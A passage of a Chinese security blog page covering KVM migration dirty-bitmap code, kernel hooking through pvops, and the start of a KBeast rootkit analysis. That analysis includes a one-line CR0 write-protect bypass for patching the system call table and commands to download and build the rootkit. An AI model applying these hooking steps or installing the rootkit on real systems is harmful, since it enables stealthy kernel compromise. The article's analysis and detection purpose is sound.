class="number">1</span> &lt;&lt; client);  </div><div class="line">    <span class="keyword">if</span> (ret) &#123;  </div><div class="line">        cpu_physical_memory_reset_dirty(mr-&gt;ram_addr + addr,  </div><div class="line">                                        mr-&gt;ram_addr + addr + size,  </div><div class="line">                                        <span class="number">1</span> &lt;&lt; client);  </div><div class="line">    &#125;  </div><div class="line">    <span class="keyword">return</span> ret;  </div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p> cpu_physical_memory_get_dirty()  —&gt;  cpu_physical_memory_get_dirty_flag()  –&gt;  return ram_list.phys_dirty[addr &gt;&gt; TARGET_PAGE_BITS]  这就获得了ram_list.phys_dirty[]相应位的数值，然后判断如果是1，执行cpu_physical_memory_reset_dirty()  –&gt;  cpu_physical_memory_mask_dirty_range()  –&gt;  cpu_physical_memory_clear_dirty_flags()  –&gt;  ram_list.phys_dirty[addr &gt;&gt; TARGET_PAGE_BITS] &amp;= mask  ，这就清了相应位。</p>
+<p>再看 migration_bitmap_set_dirty()这个函数：<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">bool</span> <span class="title">migration_bitmap_set_dirty</span><span class="params">(MemoryRegion *mr,  </span></span></div><div class="line"><span class="function"><span class="params">                                              <span class="keyword">ram_addr_t</span> offset)</span>  </span></div><div class="line"><span class="function"></span>&#123;  </div><div class="line">    <span class="keyword">bool</span> ret;  </div><div class="line">    <span class="keyword">int</span> nr = (mr-&gt;ram_addr + offset) &gt;&gt; TARGET_PAGE_BITS;  </div><div class="line">  </div><div class="line">    ret = test_and_set_bit(nr, migration_bitmap);  </div><div class="line">  </div><div class="line">    <span class="keyword">if</span> (!ret) &#123;  </div><div class="line">        migration_dirty_pages++;  </div><div class="line">    &#125;  </div><div class="line">    <span class="keyword">return</span> ret;  </div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p> 里面test_and_set_bit(nr, migration_bitmap)，这个函数将migration_bitmap置位。</p>
+<p><br><br>分析完migration_bitmap是如何复制ram_list_phys_dirty[]的，我们再分析ram_list_phys_dirty[]是如何维护的。跟内核的同步这一部分前面也提到过，具体的后面讲解。这里就分析qemu中如何随时修改的这个位图。实际上修改这个位图的函数是cpu_physical_memory_set_dirty_flags()，qemu中大概有几十处直接或间接调用这个函数，在这里就不再一一讲解。</p>
+<p>最后我们分析内核与qemu位图的同步以及内核中位图的维护。内核中的位图是memslot-&gt;dirty_bitmap，它的修改是通过mark_page_dirty_in_slot()这个函数，而mark_page_dirty_in_slot()这个函数又被kvm_write_guest_cached()和mark_page_dirty()这两个函数调用，kvm中大概有十几处调用了这两个函数，这里也不一一讲解了。</p>
+<p>关于内核与qemu位图的同步我们前面提到过memory_global_sync_dirty_bitmap()这个函数，这个过程实际上是qemu主动发起的系统调用，具体分析其代码：<br>memory_global_sync_dirty_bitmap()  –&gt;  log_sync  –&gt;  kvm_log_sync() –&gt;  kvm_physical_sync_dirty_bitmap()，分析kvm_physical_sync_dirty_bitmap()这个函数，里面有几行代码如下：<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">memset</span>(d.dirty_bitmap, <span class="number">0</span>, allocated_size);  </div><div class="line">  </div><div class="line">d.slot = mem-&gt;slot;  </div><div class="line">  </div><div class="line"><span class="keyword">if</span> (kvm_vm_ioctl(s, KVM_GET_DIRTY_LOG, &amp;d) == <span class="number">-1</span>) &#123;  </div><div class="line">    DPRINTF(<span class="string">"ioctl failed %d\n"</span>, errno);  </div><div class="line">    ret = <span class="number">-1</span>;  </div><div class="line">    <span class="keyword">break</span>;  </div><div class="line">&#125;  </div><div class="line">  </div><div class="line">kvm_get_dirty_pages_log_range(section, d.dirty_bitmap);</div></pre></td></tr></table></figure></p>
+<p>  我们可以看到，这就是ioctl系统调用，命令参数是KVM_GET_DIRTY_LOG，将内核中的位图复制到了d.dirty_bitmap中，后面又利用d来修改了ram_list_phys_dirty[]。既然是系统调用，那我们追踪到kvm内核中来看，找到kvm_vm_ioctl()函数，其中一段代码：<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">case</span> KVM_GET_DIRTY_LOG: &#123;  </div><div class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kvm_dirty_log</span> <span class="title">log</span>;</span>  </div><div class="line">  </div><div class="line">    r = -EFAULT;  </div><div class="line">    <span class="keyword">if</span> (copy_from_user(&amp;<span class="built_in">log</span>, argp, <span class="keyword">sizeof</span> <span class="built_in">log</span>))  </div><div class="line">        <span class="keyword">goto</span> out;  </div><div class="line">    r = kvm_vm_ioctl_get_dirty_log(kvm, &amp;<span class="built_in">log</span>);  </div><div class="line">    <span class="keyword">break</span>;  </div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>这一段代码里看一下kvm_vm_ioctl_get_dirty_log()函数：<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">kvm_vm_ioctl_get_dirty_log</span><span class="params">(struct kvm *kvm, struct kvm_dirty_log *<span class="built_in">log</span>)</span>  </span></div><div class="line"><span class="function"></span>&#123;  </div><div class="line">    ......  </div><div class="line">  </div><div class="line">    dirty_bitmap = memslot-&gt;dirty_bitmap;  </div><div class="line">    r = -ENOENT;  </div><div class="line">    <span class="keyword">if</span> (!dirty_bitmap)  </div><div class="line">        <span class="keyword">goto</span> out;  </div><div class="line">  </div><div class="line">    n = kvm_dirty_bitmap_bytes(memslot);  </div><div class="line">  </div><div class="line">    dirty_bitmap_buffer = dirty_bitmap + n / <span class="keyword">sizeof</span>(<span class="keyword">long</span>);  </div><div class="line">    <span class="built_in">memset</span>(dirty_bitmap_buffer, <span class="number">0</span>, n);  </div><div class="line">  </div><div class="line">    spin_lock(&amp;kvm-&gt;mmu_lock);  </div><div class="line">  </div><div class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n / <span class="keyword">sizeof</span>(<span class="keyword">long</span>); i++) &#123;  </div><div class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> mask;  </div><div class="line">        <span class="keyword">gfn_t</span> offset;  </div><div class="line">  </div><div class="line">        <span class="keyword">if</span> (!dirty_bitmap[i])  </div><div class="line">            <span class="keyword">continue</span>;  </div><div class="line">  </div><div class="line">        is_dirty = <span class="literal">true</span>;  </div><div class="line">  </div><div class="line">        mask = xchg(&amp;dirty_bitmap[i], <span class="number">0</span>);  </div><div class="line">        dirty_bitmap_buffer[i] = mask;  </div><div class="line">  </div><div class="line">        offset = i * BITS_PER_LONG;  </div><div class="line">        kvm_mmu_write_protect_pt_masked(kvm, memslot, offset, mask);  </div><div class="line">    &#125;  </div><div class="line">    <span class="keyword">if</span> (is_dirty)  </div><div class="line">        kvm_flush_remote_tlbs(kvm);  </div><div class="line">  </div><div class="line">    spin_unlock(&amp;kvm-&gt;mmu_lock);  </div><div class="line">  </div><div class="line">    r = -EFAULT;  </div><div class="line">    <span class="keyword">if</span> (copy_to_user(<span class="built_in">log</span>-&gt;dirty_bitmap, dirty_bitmap_buffer, n))  </div><div class="line">        <span class="keyword">goto</span> out;  </div><div class="line">  </div><div class="line">    r = <span class="number">0</span>;  </div><div class="line">out:  </div><div class="line">    mutex_unlock(&amp;kvm-&gt;slots_lock);  </div><div class="line">    <span class="keyword">return</span> r;  </div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>这个函数实际上是将memslot-&gt;dirty_bitmap最终通过copy_to_user()函数复制到了qemu层。这就实现了两个层次的位图同步。</p>
+<hr>
+<p><strong>转载请注明</strong>：原作者信息以及<a href="http://www.csyssec.org/about/" target="_blank" rel="external">CSysSec</a></p>
+
+      
+    </div>
+    
+    
+      <footer class="article-footer">
+        
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/KVM/">KVM</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Migration/">Migration</a></li></ul>
+
+      </footer>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+    
+      <article id="post-kernelmalware" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2017/03/30/kernelmalware/">内核层恶意代码分析</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-meta">
+      <a href="/2017/03/30/kernelmalware/" class="article-date">
+  <time datetime="2017-03-30T06:13:41.000Z" itemprop="datePublished">2017-03-30</time>
+</a>
+      
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/恶意代码/">恶意代码</a>
+  </div>
+
+      
+    </div>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <hr>
+<p>作者：<a href="http://weibo.com/diting0x/profile?rightmod=1&amp;wvr=6&amp;mod=personinfo&amp;is_all=1" target="_blank" rel="external">Diting0x</a></p>
+<p><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170330/kernelmalware" target="_blank" rel="external">内核层恶意代码分析</a>》与作者信息：<a href="http://www.csyssec.org/about/" target="_blank" rel="external">CSysSec出品</a></p>
+<hr>
+<p>本文旨在收集Linux下内核层恶意代码并进行分析，持续更新。</p>
+<ul>
+<li>来源于论文<a href="https://www.cerias.purdue.edu/assets/pdf/bibtex_archive/2010-02.pdf" target="_blank" rel="external">LiveDM: Temporal Mapping of Dynamic Kernel Memory for Dynamic Kernel Malware Analysis and Debugging, </a>rootkit操纵内核动态对象的分析结果：</li>
+</ul>
+<figure><br>    <a href="http://oij0laovn.bkt.clouddn.com/livedm1.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/livedm1.png" width="450"></a><br>    <figcaption></figcaption><br></figure>
+
+<ul>
+<li>来源于论文<a href="http://friends.cs.purdue.edu/pubs/eurosys09.pdf" target="_blank" rel="external">Multi-Aspect Profiling of Kernel Rootkit Behavior, EuroSys’09</a>中PoKeR系统对rootkit行为的分析结果：</li>
+</ul>
+<figure><br>    <a href="http://oij0laovn.bkt.clouddn.com/pokerresult.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/pokerresult.png" width="450"></a><br>    <figcaption></figcaption><br></figure>
+
+<ul>
+<li>来源于论文<a href="http://www.cs.umd.edu/~mwh/papers/sbcfi.pdf" target="_blank" rel="external">Automated Detection of Persistent Kernel<br>Control-Flow Attacks,CCS’07</a>对内核层恶意代码的行为以及利用的机制分析结果：</li>
+</ul>
+<figure><br>    <a href="http://oij0laovn.bkt.clouddn.com/sbcfi.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/sbcfi.png" width="450"></a><br>    <figcaption></figcaption><br></figure>
+
+
+<ul>
+<li>部分用于研究目的的内核层恶意代码源码分享，可以参考<a href="https://github.com/chonghw/research-malware" target="_blank" rel="external">这里</a></li>
+</ul>
+<hr>
+<p>作者：<a href="http://weibo.com/diting0x/profile?rightmod=1&amp;wvr=6&amp;mod=personinfo&amp;is_all=1" target="_blank" rel="external">Diting0x</a></p>
+<p><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170330/kernelmalware" target="_blank" rel="external">内核层恶意代码分析</a>》与作者信息：<a href="http://www.csyssec.org/about/" target="_blank" rel="external">CSysSec出品</a></p>
+
+      
+    </div>
+    
+    
+      <footer class="article-footer">
+        
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Malware/">Malware</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Rootkit/">Rootkit</a></li></ul>
+
+      </footer>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+    
+      <article id="post-pvops" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2017/03/01/pvops/">Hook内核之PVOPS</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-meta">
+      <a href="/2017/03/01/pvops/" class="article-date">
+  <time datetime="2017-03-01T05:19:20.000Z" itemprop="datePublished">2017-03-01</time>
+</a>
+      
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/系统内核/">系统内核</a>
+  </div>
+
+      
+    </div>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>作者：<a href="http://weibo.com/diting0x" target="_blank" rel="external">Diting0x</a></p>
+<hr>
+<p><strong>CSysSec注</strong>： 本文来自<a href="http://www.chongh.wiki/about/" target="_blank" rel="external">Diting0x</a>的<a href="http://www.chongh.wiki/blog/2016/05/03/pvops/" target="_blank" rel="external">个人博客</a>，讲述在虚拟化平台下如何利用PVOPS框架来hook内核<br><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170301/pvops/" target="_blank" rel="external">Hook内核之PVOPS</a>》与作者信息：<a href="http://weibo.com/diting0x" target="_blank" rel="external">Diting0x</a></p>
+<hr>
+<p>pvops是做什么的？ 简单地说，hook kernel.<br>利用pvops你可以自定义自己的write_cr3函数，你可以修改页表，追踪页表更新的信息，而这些听起来非常底层的操作，利用pvops都变得简单起来。</p>
+<p>pvops接口来源于Xen项目，初衷是建立一个类虚拟化(para-virtualized）内核来适应于不同的hypervisor，当然也包括适应于非虚拟化平台。</p>
+<p>pvops将类虚拟化操作分成一系列结构：pv_time_ops,pv_cpu_ops,pv_mmu_ops,pv_lock_ops和pv_irq_ops。</p>
+<p>举个例子，x86系统中利用’MOV CR3’指令来加载页表。pvops将其替换为一个间接跳转到pv_mmu_ops -&gt; write_cr3函数。 每种虚拟化系统，包括本地x86平台，对这些函数都有自己的实现。 对于x86平台，这些函数的实现只是简单地对原始函数指令的封装。比如对于pv_mmu_ops -&gt; write_cr3函数，x86平台的具体实现为native_write_cr3函数：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">native_write_cr3</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> val)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">        asm volatile("mov %0,%%cr3": : "r" (val), "m" (__force_order));</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>pvops将本地底层的硬件指令通过pv_xxx_ops结构体替换为间接跳转函数。下面以pv_mmu_ops为例，详细分析其内部结构，pv_mmu_ops的定义为：(文中列出主要部分，完整定义，可参看<a href="http://lxr.free-electrons.com/source/arch/x86/kernel/paravirt.c#L395" target="_blank" rel="external">pv_mmu_ops结构定义</a>）</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pv_mmu_ops</span> &#123;</span></div><div class="line">         <span class="function"><span class="keyword">unsigned</span> <span class="title">long</span> <span class="params">(*read_cr2)</span><span class="params">(<span class="keyword">void</span>)</span></span>;</div><div class="line">         <span class="keyword">void</span> (*write_cr2)(<span class="keyword">unsigned</span> <span class="keyword">long</span>);</div><div class="line"> </div><div class="line">         <span class="function"><span class="keyword">unsigned</span> <span class="title">long</span> <span class="params">(*read_cr3)</span><span class="params">(<span class="keyword">void</span>)</span></span>;</div><div class="line">         <span class="keyword">void</span> (*write_cr3)(<span class="keyword">unsigned</span> <span class="keyword">long</span>);</div><div class="line"> </div><div class="line">         <span class="comment">/*</span></div><div class="line"><span class="comment">          * Hooks for intercepting the creation/use/destruction of an</span></div><div class="line"><span class="comment">          * mm_struct.</span></div><div class="line"><span class="comment">          */</span></div><div class="line">         <span class="keyword">void</span> (*activate_mm)(struct mm_struct *prev,</div><div class="line">                             struct mm_struct *next);</div><div class="line">         <span class="keyword">void</span> (*dup_mmap)(struct mm_struct *oldmm,</div><div class="line">                          struct mm_struct *mm);</div><div class="line">         <span class="keyword">void</span> (*exit_mmap)(struct mm_struct *mm);</div><div class="line"> </div><div class="line"> </div><div class="line">         <span class="comment">/* TLB operations */</span></div><div class="line">         <span class="keyword">void</span> (*flush_tlb_user)(<span class="keyword">void</span>);</div><div class="line">         <span class="keyword">void</span> (*flush_tlb_kernel)(<span class="keyword">void</span>);</div><div class="line">         <span class="keyword">void</span> (*flush_tlb_single)(<span class="keyword">unsigned</span> <span class="keyword">long</span> addr);</div><div class="line">         <span class="keyword">void</span> (*flush_tlb_others)(<span class="keyword">const</span> struct cpumask *cpus,</div><div class="line">                                  struct mm_struct *mm,</div><div class="line">                                  <span class="keyword">unsigned</span> <span class="keyword">long</span> start,</div><div class="line">                                  <span class="keyword">unsigned</span> <span class="keyword">long</span> end);</div><div class="line"> </div><div class="line">         <span class="comment">/* Hooks for allocating and freeing a pagetable top-level */</span></div><div class="line">         <span class="keyword">int</span>  (*pgd_alloc)(struct mm_struct *mm);</div><div class="line">         <span class="keyword">void</span> (*pgd_free)(struct mm_struct *mm, <span class="keyword">pgd_t</span> *pgd);</div><div class="line"> </div><div class="line">         <span class="comment">/*</span></div><div class="line"><span class="comment">          * Hooks for allocating/releasing pagetable pages when they're</span></div><div class="line"><span class="comment">          * attached to a pagetable</span></div><div class="line"><span class="comment">          */</span></div><div class="line">         <span class="keyword">void</span> (*alloc_pte)(struct mm_struct *mm, <span class="keyword">unsigned</span> <span class="keyword">long</span> pfn);</div><div class="line">         <span class="keyword">void</span> (*alloc_pmd)(struct mm_struct *mm, <span class="keyword">unsigned</span> <span class="keyword">long</span> pfn);</div><div class="line">         <span class="keyword">void</span> (*alloc_pud)(struct mm_struct *mm, <span class="keyword">unsigned</span> <span class="keyword">long</span> pfn);</div><div class="line">         <span class="keyword">void</span> (*release_pte)(<span class="keyword">unsigned</span> <span class="keyword">long</span> pfn);</div><div class="line">         <span class="keyword">void</span> (*release_pmd)(<span class="keyword">unsigned</span> <span class="keyword">long</span> pfn);</div><div class="line">         <span class="keyword">void</span> (*release_pud)(<span class="keyword">unsigned</span> <span class="keyword">long</span> pfn);</div><div class="line"> </div><div class="line">         <span class="comment">/* Pagetable manipulation functions */</span></div><div class="line">         <span class="keyword">void</span> (*set_pte)(<span class="keyword">pte_t</span> *ptep, <span class="keyword">pte_t</span> pteval);</div><div class="line">         <span class="keyword">void</span> (*set_pte_at)(struct mm_struct *mm, <span class="keyword">unsigned</span> <span class="keyword">long</span> addr,</div><div class="line">                            <span class="keyword">pte_t</span> *ptep, <span class="keyword">pte_t</span> pteval);</div><div class="line">         <span class="keyword">void</span> (*set_pmd)(<span class="keyword">pmd_t</span> *pmdp, <span class="keyword">pmd_t</span> pmdval);</div><div class="line">         <span class="keyword">void</span> (*set_pmd_at)(struct mm_struct *mm, <span class="keyword">unsigned</span> <span class="keyword">long</span> addr,</div><div class="line">                            <span class="keyword">pmd_t</span> *pmdp, <span class="keyword">pmd_t</span> pmdval);</div><div class="line">         <span class="keyword">void</span> (*pte_update)(struct mm_struct *mm, <span class="keyword">unsigned</span> <span class="keyword">long</span> addr,</div><div class="line">                            <span class="keyword">pte_t</span> *ptep);</div><div class="line"> </div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>比如说你要在分配页表项的时候hook (<em>write_cr3)函数, 可以将(</em>write_cr3)函数赋值为自己的自定义函数。 默认情况下，内核中pvops框架中提供的自定义函数如下： (完整可参看 <a href="http://lxr.free-electrons.com/source/arch/x86/kernel/paravirt.c#L395" target="_blank" rel="external">pv_mmu_ops函数定义</a>)</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pv_mmu_ops</span> <span class="title">pv_mmu_ops</span> &#123;</span></div><div class="line"></div><div class="line">.read_cr2 = native_read_cr2,</div><div class="line">.write_cr2 = native_write_cr2,</div><div class="line">.read_cr3 = native_read_cr3,</div><div class="line">.write_cr3 = native_write_cr3,</div><div class="line"> .alloc_pte = paravirt_nop,</div><div class="line">.alloc_pmd = paravirt_nop,</div><div class="line">.alloc_pud = paravirt_nop,</div><div class="line">.release_pte = paravirt_nop,</div><div class="line">.release_pmd = paravirt_nop,</div><div class="line">.release_pud = paravirt_nop,</div><div class="line"></div><div class="line">.set_pte = native_set_pte,</div><div class="line">.set_pte_at = native_set_pte_at,</div><div class="line">.set_pmd = native_set_pmd,</div><div class="line">.set_pmd_at = native_set_pmd_at,</div><div class="line">.pte_update = paravirt_nop,</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>接着定义的函数会被传入到这里：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"> <span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">write_cr3</span><span class="params">(struct mm_struct *mm, <span class="keyword">unsigned</span> <span class="keyword">long</span> pfn)</span></span></div><div class="line"><span class="function"> </span>&#123;</div><div class="line">         PVOP_VCALL2(pv_mmu_ops.write_cr3, mm, pfn);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>至于PVOP_VCALL2具体做了什么，可以不必去关心。</p>
+<p>完</p>
+<hr>
+<p><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170301/pvops/" target="_blank" rel="external">Hook内核之PVOPS</a>》与作者信息：<a href="http://weibo.com/diting0x" target="_blank" rel="external">Diting0x</a></p>
+<hr>
+
+      
+    </div>
+    
+    
+      <footer class="article-footer">
+        
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Kernel/">Kernel</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/System/">System</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Virtualization/">Virtualization</a></li></ul>
+
+      </footer>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+    
+      <article id="post-kbeastanalysis" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2017/01/04/kbeastanalysis/">内核层恶意代码KBeast分析与检测</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-meta">
+      <a href="/2017/01/04/kbeastanalysis/" class="article-date">
+  <time datetime="2017-01-04T08:12:27.000Z" itemprop="datePublished">2017-01-04</time>
+</a>
+      
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/恶意代码/">恶意代码</a>
+  </div>
+
+      
+    </div>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>作者：<a href="http://weibo.com/diting0x" target="_blank" rel="external">Diting0x</a></p>
+<hr>
+<p><strong>CSysSec注</strong>： 本文来自<a href="http://www.chongh.wiki/about/" target="_blank" rel="external">Diting0x</a>的<a href="http://www.chongh.wiki/blog/2016/04/03/kbeast-analysis-detection/" target="_blank" rel="external">个人博客</a>，该文深入分析了KBeast的原理以及源代码，并给出了检测KBeast实验方法，KBeast是学习内核层恶意代码不错的样本。<br><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170104/kbeastanalysis/" target="_blank" rel="external">内核层恶意代码KBeast分析与检测</a>》与作者信息：<a href="http://weibo.com/diting0x" target="_blank" rel="external">Diting0x</a></p>
+<hr>
+<blockquote>
+<ul>
+<li>0x01 全文环境</li>
+<li>0X02 Kbeast 特性</li>
+<li>0X03 系统调用劫持基础</li>
+<li>0X04 Kbeast 使用</li>
+<li>0X05 Kbeast 核心</li>
+<li>0X06 Libvmi and Volatility检测KBeast</li>
+</ul>
+</blockquote>
+<hr>
+<h3 id="0x01-全文环境"><a href="#0x01-全文环境" class="headerlink" title="0x01 全文环境"></a>0x01 全文环境</h3><p>Host Ubuntu 12.04 + Guest Ubuntu 10.04/11.04 + Libvmi + Volatility</p>
+<p>其中Kbeast运行在Guest Ubuntu 10.04/11.04中，libvmi与volatility运行在Host Ubuntu12.04中。</p>
+<h3 id="0X02-Kbeast-特性"><a href="#0X02-Kbeast-特性" class="headerlink" title="0X02 Kbeast 特性"></a>0X02 Kbeast 特性</h3><p>以下是Kbeast实现的功能：</p>
+<ul>
+<li>隐藏可加载模块（LKM)</li>
+<li>隐藏文件/目录</li>
+<li>隐藏进程（ps,pstree,top,lsof)</li>
+<li>隐藏套接字和网络连接(netstat,lsof)</li>
+<li>记录键盘操作捕获用户行为</li>
+<li>反杀死进程</li>
+<li>反移除文件</li>
+<li>反删除可加载模块</li>
+<li>root提权后门</li>
+<li>远程绑定后门 </li>
+</ul>
+<h3 id="0X03-系统调用劫持基础"><a href="#0X03-系统调用劫持基础" class="headerlink" title="0X03 系统调用劫持基础"></a>0X03 系统调用劫持基础</h3><p>上述的Kbeast特性都是通过系统调用劫持实现的。在kernel 2.6.*之前，系统调用表”sys_call_table”是可以直接导出引用的，如：</p>
+<pre><code>extern void *sys_call_table[];
+sys_call_table[__NR_syscall] = pointer
+</code></pre><p>而在kernel 2.6.* 之后禁用了这种特性，并且其所在页是写保护的。然而，系统调用表依然在内存中，如果知道其所在内存地址，依然可以通过指针访问。内核中的符号表System.map （一般在/boot/目录下)记录了所有的符号及其地址，当然也包括系统调用表”sys_call_table”.  以Ubuntu 10.04为例，执行：</p>
+<pre><code>grep sys_call_table /boot/System.map-2.6.32-21-generic
+</code></pre><p>显示的结果为</p>
+<pre><code>c0592150 R sys_call_table
+</code></pre><p>c0592150指的是线性地址，R说明此地址所在的页面Read-only。目前的CPU都会将CR0控制寄存器的第16位（wp-bit）置1,将页面开启保护模式，这时CPU处于”write-proteed”模式，否则处于”read/write”模式。CR0寄存器的位描述可参考<a href="https://en.wikipedia.org/wiki/Control_register#CR0" target="_blank" rel="external">CR0</a>. </p>
+<p>如果能将WP位置0，就可以访问内存页面,读写系统调用表了。 下面这行代码便可实现此功能：</p>
+<pre><code>write_cr0 (read_cr0 () &amp; (~ 0x10000));
+</code></pre><h3 id="0X04-Kbeast-使用"><a href="#0X04-Kbeast-使用" class="headerlink" title="0X04 Kbeast 使用"></a>0X04 Kbeast 使用</h3><p>下载<a href="https://packetstormsecurity.com/files/108286/KBeast-Kernel-Beast-Linux-Rootkit-2012.html" target="_blank" rel="external">Kbeast</a>. </p>
+<pre><code>tar xzf ipsecs-kbeast-v1.tar.gz
+cd kbeast-v1
+./setup build 1  
+</code></pre><p>具体可参考/kbeast-v1/setup 文件，参数1表示默认为kernel 2.6.32。测试过ubuntu11.04 内核为2.6.38，setup出错，作者声称：<br>Be kind to note that the beast has been tested in, but not limited to, kernel 2.6.9,<br>2.6.16, 2.6.18, 2.6.32, 2.6.35 (i386 or x86_64)，理论上只要修改setup相关参数以及ipsecs-kbeast-vl.c文件中的系统调用表的地址即可适应其它版本内核，未测试。</p>
